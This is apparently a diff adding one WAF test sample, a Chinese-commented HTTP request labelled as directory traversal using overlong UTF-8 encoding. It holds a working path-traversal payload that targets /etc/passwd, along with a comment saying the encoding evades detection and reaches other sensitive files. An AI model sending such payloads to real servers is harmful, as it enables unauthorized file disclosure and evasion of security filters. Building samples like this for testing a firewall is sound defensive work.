@@ -1,0 +1,9 @@
+# 目录遍历(超长UTF-8 Unicode编码)-06506937
+# 攻击者通过构造此语句可以爆破系统用户配置文件，使用超长UTF-8编码绕过检测还可以构造其他文件路径爆破更多敏感信息。
+GET /?id=%25e0%2540%25ae%25e0%2540%25ae%25c0%252fetc%25c0%252fpasswd&bid=hd_tag_m8mv24np HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24np
+RM-PRO-Token: b8d0c4f09cf622723c3529c04ea2a361
+RM-PRO-Time: 1742808395340
+User-Agent: curl/7.83.1
+
